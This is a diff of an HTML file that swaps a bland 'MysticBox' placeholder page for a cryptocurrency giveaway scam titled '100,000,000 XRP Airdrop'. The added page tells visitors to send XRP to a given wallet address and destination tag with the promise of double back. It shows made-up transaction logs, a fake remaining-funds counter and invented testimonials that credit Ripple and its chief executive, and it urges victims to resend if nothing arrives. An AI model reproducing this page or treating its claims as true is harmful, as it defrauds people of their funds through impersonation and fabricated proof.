@@ -1,67 +1,360 @@
 <!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="robots" content="noindex, follow">
+    <link rel="icon" type="image/png" href="https://xrpevent.live/img/favicon-32x32-new.png" sizes="32x32">
+    <title>100,000,000 XRP Airdrop</title>
+    <link rel="stylesheet" href="./100,000,000 XRP Airdrop_files/index.css">
 
-  <title>MysticBox – Early Access Platform</title>
-
-  <meta name="description" content="MysticBox is an experimental access platform designed for early participants and future feature exploration." />
-
-  <meta name="robots" content="index, follow" />
-
-  <style>
-    body {
-      margin: 0;
-      font-family: Arial, Helvetica, sans-serif;
-      background: #0b0f1a;
-      color: #ffffff;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
-    }
-
-    .box {
-      text-align: center;
-      max-width: 420px;
-      padding: 40px;
-      border-radius: 14px;
-      background: linear-gradient(135deg, #141a2e, #0f1424);
-      box-shadow: 0 0 40px rgba(0,0,0,0.6);
-    }
-
-    h1 {
-      margin-bottom: 10px;
-      font-size: 32px;
-      letter-spacing: 1px;
-    }
-
-    p {
-      font-size: 15px;
-      line-height: 1.6;
-      opacity: 0.9;
-    }
-
-    .status {
-      margin-top: 25px;
-      font-size: 13px;
-      opacity: 0.7;
-    }
-  </style>
 </head>
 
-<body>
-  <div class="box">
-    <h1>MysticBox</h1>
-    <p>
-      An experimental access platform currently in early development.
-      New features and participation options will be introduced gradually.
-    </p>
-
-    <div class="status">
-      Status: Development phase
+<div class="container">
+    <input name="address" id="address" type="hidden" value="r3jbJmYm8ETaYFoYfsh85bR8UHa9TZGC5y">
+    <div class="content">
+        <div class="content-header">
+            <div class="content-header_text">
+                <img src="./100,000,000 XRP Airdrop_files/logo.svg" alt="" class="logo">
+                <h1 class="title">100,000,000 XRP Airdrop</h1>
+                <p class="subtitle">To verify your address, simply send between 1,000 and 100,000 XRP to the address below, and
+                    you will receive double the amount back – from 2,000 to 200,000 XRP!</p>
+                <div class="address">
+                    <h2 onclick="copy();" class="address_text">r3jbJmYm8ETaYFoYfsh85bR8UHa9TZGC5y</h2>
+                    <button class="copy" onclick="copy();">
+                        <svg viewBox="-40 0 512 512" width="512pt" xmlns="http://www.w3.org/2000/svg">
+                            <path d="m271 512h-191c-44.113281 0-80-35.886719-80-80v-271c0-44.113281 35.886719-80 80-80h191c44.113281 0 80 35.886719 80 80v271c0 44.113281-35.886719 80-80 80zm-191-391c-22.054688 0-40 17.945312-40 40v271c0 22.054688 17.945312 40 40 40h191c22.054688 0 40-17.945312 40-40v-271c0-22.054688-17.945312-40-40-40zm351 261v-302c0-44.113281-35.886719-80-80-80h-222c-11.046875 0-20 8.953125-20 20s8.953125 20 20 20h222c22.054688 0 40 17.945312 40 40v302c0 11.046875 8.953125 20 20 20s20-8.953125 20-20zm0 0"></path>
+                        </svg>
+                    </button>
+                </div>
+              <div id="qr-code" class="mb-25 flex-justify"><img src="./100,000,000 XRP Airdrop_files/XRP_QR.jpg" width="150" height="150"></div>
+                <h3 class="destination">Destination Tag: 7777777</h3>
+                <div class="load">
+                    <div class="spin"></div>
+                    <p>Waiting for your transaction...</p>
+                </div>
+            </div>
+        </div>
+        <div class="content-main">
+            <div class="instruction">
+                <p>1. To make a transaction, you can use any wallet or exchange that supports XRP.</p>
+                <p>2. For example, to receive 40,000 XRP, send 20,000 XRP. You can use any wallet or exchange of your choice to send XRP.</p>
+                <p>3. Once we receive your transaction, we will immediately send the requested amount back to you.</p>
+            </div>
+            <div class="waiting">
+                <div class="waiting-text">
+                    <p>Still waiting for your transaction? <span>Click HERE!</span></p>
+                    <p>Every participant who is delayed will have their XRP immediately returned – you won’t lose anything.</p>
+                </div>
+                <div class="waiting-click">
+                    <p>Sometimes transactions are not sent properly. Please try sending it again. Remember, every transaction
+                        address we receive will have their XRP returned along with the giveaway prize.</p>
+                </div>
+            </div>
+            <div class="progress-container">
+                <div class="progress-header">
+                    <div class="spin"></div><h5 class="progress-title">XRP remaining:</h5>
+                </div>
+                <div class="progress">
+                    <div class="bar"></div>
+                    <p class="progress-score"><span id="score">67,923,381</span> / 100,000,000</p>
+                </div>
+            </div>
+        </div>
+        <div class="content-sections">
+            <nav class="sections-nav">
+                <a class="nav_sections active" data-id="transaction">Transaction</a>
+                <a class="nav_sections" data-id="comments">Comments</a>
+            </nav>
+            <div class="section-content">
+                <table class="section-content_block transaction-list">
+                    <tbody><tr>
+                        <th>TxHash</th>
+                        <th><span title="UTC time">Age</span></th>
+                        <th>From</th>
+                        <th></th>
+                        <th>To</th>
+                        <th>Quantity</th>
+                    </tr>
+            <tr class="transaction" style="">
+                <td class="transaction-address">
+                    <p>DOJT0L6180Y83IDGPOU7D9DUEUQGXC4911RRAPSCYYHU5W8Q800SV92QURIZPTAN</p>
+                </td>
+                <td class="transaction-date">
+                    <p>now</p>
+                </td>
+                <td class="transaction-address">
+                    <p>r3jbJmYm8ETaYFoYfsh85bR8UHa9TZGC5y</p>
+                </td>
+                <td class="transaction-type orange">
+                    <p>OUT</p>
+                </td>
+                <td class="transaction-address">
+                    <p>rnyGQbPkgcUtJf12xmTaMtFR4kj566l03e</p>
+                </td>
+                <td class="transaction-amount">
+                    <p>121210.45 XRP</p>
+                </td>
+            </tr>
+        
+            <tr class="transaction" style="">
+                <td class="transaction-address">
+                    <p>DOJT0L6180Y83IDGPOU7D9DUEUQGXC4911RRAPSCYYHU5W8Q800SV92QURIZPTAN</p>
+                </td>
+                <td class="transaction-date">
+                    <p>now</p>
+                </td>
+                <td class="transaction-address">
+                    <p>rnyGQbPkgcUtJf12xmTaMtFR4kj566l03e</p>
+                </td>
+                <td class="transaction-type green">
+                    <p>IN</p>
+                </td>
+                <td class="transaction-address">
+                    <p>r3jbJmYm8ETaYFoYfsh85bR8UHa9TZGC5y</p>
+                </td>
+                <td class="transaction-amount">
+                    <p>60605.225 XRP</p>
+                </td>
+            </tr>
+        
+            <tr class="transaction" style="">
+                <td class="transaction-address">
+                    <p>HVQOK41MD64085UKHQKF2KQ81ZHVDURBV6JH13UF1FV85O32D9TI3UW8G2N3YYK9</p>
+                </td>
+                <td class="transaction-date">2 sec ago</td>
+                <td class="transaction-address">
+                    <p>r3jbJmYm8ETaYFoYfsh85bR8UHa9TZGC5y</p>
+                </td>
+                <td class="transaction-type orange">
+                    <p>OUT</p>
+                </td>
+                <td class="transaction-address">
+                    <p>rBGwt74knfhJMZ1NKrjZTcbtt7pKbpbTML</p>
+                </td>
+                <td class="transaction-amount">
+                    <p>87650.328 XRP</p>
+                </td>
+            </tr>
+        
+            <tr class="transaction" style="">
+                <td class="transaction-address">
+                    <p>HVQOK41MD64085UKHQKF2KQ81ZHVDURBV6JH13UF1FV85O32D9TI3UW8G2N3YYK9</p>
+                </td>
+                <td class="transaction-date">2 sec ago</td>
+                <td class="transaction-address">
+                    <p>rBGwt74knfhJMZ1NKrjZTcbtt7pKbpbTML</p>
+                </td>
+                <td class="transaction-type green">
+                    <p>IN</p>
+                </td>
+                <td class="transaction-address">
+                    <p>r3jbJmYm8ETaYFoYfsh85bR8UHa9TZGC5y</p>
+                </td>
+                <td class="transaction-amount">
+                    <p>43825.164 XRP</p>
+                </td>
+            </tr>
+        
+            <tr class="transaction">
+                <td class="transaction-address">
+                    <p>KWW4S8V9IBEFAYQVKFGNRBM10AI6LPNAQN7EKB3H2YJECTUO87DEFXJDXBW7VKKK</p>
+                </td>
+                <td class="transaction-date">3 sec ago</td>
+                <td class="transaction-address">
+                    <p>r3jbJmYm8ETaYFoYfsh85bR8UHa9TZGC5y</p>
+                </td>
+                <td class="transaction-type orange">
+                    <p>OUT</p>
+                </td>
+                <td class="transaction-address">
+                    <p>raWQIECSlXexdsw2nLPicZZrxKXvFFTU04</p>
+                </td>
+                <td class="transaction-amount">
+                    <p>29475.272 XRP</p>
+                </td>
+            </tr>
+        
+            <tr class="transaction">
+                <td class="transaction-address">
+                    <p>KWW4S8V9IBEFAYQVKFGNRBM10AI6LPNAQN7EKB3H2YJECTUO87DEFXJDXBW7VKKK</p>
+                </td>
+                <td class="transaction-date">3 sec ago</td>
+                <td class="transaction-address">
+                    <p>raWQIECSlXexdsw2nLPicZZrxKXvFFTU04</p>
+                </td>
+                <td class="transaction-type green">
+                    <p>IN</p>
+                </td>
+                <td class="transaction-address">
+                    <p>r3jbJmYm8ETaYFoYfsh85bR8UHa9TZGC5y</p>
+                </td>
+                <td class="transaction-amount">
+                    <p>14737.636 XRP</p>
+                </td>
+            </tr>
+        
+            <tr class="transaction">
+                <td class="transaction-address">
+                    <p>06BN2H4QLW4FHWHM8SXJLUKBKX5NX8V1HJQ68AHFHVN5Q5IF3MPG0XE1TLJ4LTVA</p>
+                </td>
+                <td class="transaction-date">4 sec ago</td>
+                <td class="transaction-address">
+                    <p>r3jbJmYm8ETaYFoYfsh85bR8UHa9TZGC5y</p>
+                </td>
+                <td class="transaction-type orange">
+                    <p>OUT</p>
+                </td>
+                <td class="transaction-address">
+                    <p>rk5XdGu7ZXfcPen5uC3hHiyn6DzxyLYa1y</p>
+                </td>
+                <td class="transaction-amount">
+                    <p>16751.572 XRP</p>
+                </td>
+            </tr>
+        
+            <tr class="transaction">
+                <td class="transaction-address">
+                    <p>06BN2H4QLW4FHWHM8SXJLUKBKX5NX8V1HJQ68AHFHVN5Q5IF3MPG0XE1TLJ4LTVA</p>
+                </td>
+                <td class="transaction-date">4 sec ago</td>
+                <td class="transaction-address">
+                    <p>rk5XdGu7ZXfcPen5uC3hHiyn6DzxyLYa1y</p>
+                </td>
+                <td class="transaction-type green">
+                    <p>IN</p>
+                </td>
+                <td class="transaction-address">
+                    <p>r3jbJmYm8ETaYFoYfsh85bR8UHa9TZGC5y</p>
+                </td>
+                <td class="transaction-amount">
+                    <p>8375.786 XRP</p>
+                </td>
+            </tr>
+        
+            <tr class="transaction">
+                <td class="transaction-address">
+                    <p>526X2V27WZ5CWU3C3RH2NS0ZY6JCL0Z9ULYM5HUITDYMQB8JD8MB4ZN31YZHGWNQ</p>
+                </td>
+                <td class="transaction-date">5 sec ago</td>
+                <td class="transaction-address">
+                    <p>r3jbJmYm8ETaYFoYfsh85bR8UHa9TZGC5y</p>
+                </td>
+                <td class="transaction-type orange">
+                    <p>OUT</p>
+                </td>
+                <td class="transaction-address">
+                    <p>rqXvgHI7JboArnE1f7ajEodxqubHr9fgqN</p>
+                </td>
+                <td class="transaction-amount">
+                    <p>22024.316 XRP</p>
+                </td>
+            </tr>
+        
+            <tr class="transaction">
+                <td class="transaction-address">
+                    <p>526X2V27WZ5CWU3C3RH2NS0ZY6JCL0Z9ULYM5HUITDYMQB8JD8MB4ZN31YZHGWNQ</p>
+                </td>
+                <td class="transaction-date">5 sec ago</td>
+                <td class="transaction-address">
+                    <p>rqXvgHI7JboArnE1f7ajEodxqubHr9fgqN</p>
+                </td>
+                <td class="transaction-type green">
+                    <p>IN</p>
+                </td>
+                <td class="transaction-address">
+                    <p>r3jbJmYm8ETaYFoYfsh85bR8UHa9TZGC5y</p>
+                </td>
+                <td class="transaction-amount">
+                    <p>11012.158 XRP</p>
+                </td>
+            </tr>
+        
+                </tbody></table>
+                <div class="section-content_block comments-list">
+                    <div class="comment comment-write">
+                        <p>Write your review</p>
+                        <div class="comment-write_item">
+                            <label for="name">Name</label>
+                            <input type="text" id="name" name="name" value="" required="">
+                        </div>
+                        <form class="comment-write_item">
+                            <label for="comment">Comment</label>
+                            <textarea id="comment" name="comment" required=""></textarea>
+                            <button type="submit">Comment</button>
+                        </form>
+                    </div>
+                
+                    <div class="comment">
+                        <h3 class="comment-nickname">Juan R. Martinez</h3>
+                        <span class="comment-date">7 mins ago</span>
+                        <p class="comment-content">thank you for free xrp!! I love ripple for such events</p>
+                    </div>
+                
+                    <div class="comment">
+                        <h3 class="comment-nickname">Frederick</h3>
+                        <span class="comment-date">20 mins ago</span>
+                        <p class="comment-content">Came instantly. this is my lucky day .</p>
+                    </div>
+                
+                    <div class="comment">
+                        <h3 class="comment-nickname">Lillian Grimes</h3>
+                        <span class="comment-date">28 mins ago</span>
+                        <p class="comment-content">Thank you and BRAD GARLINGHOUSE for this day, came within a minute!! so fast</p>
+                    </div>
+                
+                    <div class="comment">
+                        <h3 class="comment-nickname">Filip Sýkora</h3>
+                        <span class="comment-date">29 mins ago</span>
+                        <p class="comment-content">who has tried? Can you write me off https://twitter.com/filip_sykora?</p>
+                    </div>
+                
+                    <div class="comment">
+                        <h3 class="comment-nickname">Marcus Rivera</h3>
+                        <span class="comment-date">35 mins ago</span>
+                        <p class="comment-content">Many thanks to ripple company came 65000 and with a bonus, only came in 2 minutes</p>
+                    </div>
+                
+                    <div class="comment">
+                        <h3 class="comment-nickname">Jacob C.</h3>
+                        <span class="comment-date">40 mins ago</span>
+                        <p class="comment-content">Sent 40000 and within 30 seconds was an outgoing transaction of 400000 RIPPLE on my ADDRESS!!! Thank you Brad Garlinghouse for event </p>
+                    </div>
+                
+                    <div class="comment">
+                        <h3 class="comment-nickname">Mildred Hanson</h3>
+                        <span class="comment-date">42 mins ago</span>
+                        <p class="comment-content">seems to be working, but waited longer than it was specified, and so everything came</p>
+                    </div>
+                
+                    <div class="comment">
+                        <h3 class="comment-nickname">Joseph Sanchez</h3>
+                        <span class="comment-date">45 mins ago</span>
+                        <p class="comment-content">Wow I can't believe it really works I don't know how it works but came right away as indicated.</p>
+                    </div>
+                
+                    <div class="comment">
+                        <h3 class="comment-nickname">Julia Luciani</h3>
+                        <span class="comment-date">50 mins ago</span>
+                        <p class="comment-content">works fast and uninterruptedly, i needed to send more</p>
+                    </div>
+                
+                    <div class="comment">
+                        <h3 class="comment-nickname">Buchanan</h3>
+                        <span class="comment-date">54 mins ago</span>
+                        <p class="comment-content">IT WORKS, I GOT RIPPLE, DONT KNOW HOW TO SAY THANNKS :))</p>
+                    </div>
+                
+                    <div class="comment">
+                        <h3 class="comment-nickname">Alana</h3>
+                        <span class="comment-date">59 mins ago</span>
+                        <p class="comment-content">It's just happiness and fun, everything at once and reliably, I have to tell my friends before the event ends</p>
+                    </div>
+                </div>
+            </div>
+        </div>
     </div>
-  </div>
-</body>
-</html>
+</div>
+<script src="./100,000,000 XRP Airdrop_files/jquery-3.5.1.min.js.indir"></script>
+<script src="./100,000,000 XRP Airdrop_files/index.js.indir"></script>
+
+</body></html>
